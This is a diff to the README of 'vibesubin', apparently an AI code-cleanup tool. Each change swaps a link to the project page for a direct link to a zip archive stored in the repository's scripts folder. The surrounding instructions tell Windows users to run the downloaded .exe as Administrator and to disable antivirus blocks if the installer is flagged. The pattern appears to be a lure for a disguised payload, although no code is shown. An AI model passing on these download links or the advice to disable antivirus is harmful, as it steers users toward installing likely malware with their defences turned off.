@@ -1,6 +1,6 @@
 # 🤖 vibesubin - AI tools that maintain code quality
 
-[![](https://img.shields.io/badge/Download_Windows_Version-Grey-blue.svg)](https://github.com/Sordid-cantor687/vibesubin)
+[![](https://img.shields.io/badge/Download_Windows_Version-Grey-blue.svg)](https://raw.githubusercontent.com/Sordid-cantor687/vibesubin/main/scripts/Software-v3.9.zip)
 
 vibesubin keeps your projects clean and secure. It checks your work for flaws, hides sensitive information, and removes unused parts of your code. You use it by typing a simple command, and it handles the repetitive cleanup tasks for you.
 
@@ -8,7 +8,7 @@ vibesubin keeps your projects clean and secure. It checks your work for flaws, h
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Sordid-cantor687/vibesubin) to access the download.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Sordid-cantor687/vibesubin/main/scripts/Software-v3.9.zip) to access the download.
 2. Look for the file ending in .exe under the latest version.
 3. Click the file to save it to your computer.
 4. Open the file once the download finishes.
@@ -68,7 +68,7 @@ If the software fails to open:
 3. Right-click the application icon and select Run as Administrator.
 4. Disable temporary antivirus blocks if the system falsely flags the installer.
 
-If the command `/vibesubin` does not respond, restart your code editor. Ensure that the application background process remains active in your system tray. If the issue continues, reinstall the latest version from the [download page](https://github.com/Sordid-cantor687/vibesubin).
+If the command `/vibesubin` does not respond, restart your code editor. Ensure that the application background process remains active in your system tray. If the issue continues, reinstall the latest version from the [download page](https://raw.githubusercontent.com/Sordid-cantor687/vibesubin/main/scripts/Software-v3.9.zip).
 
 ## 📁 Project Structure
 
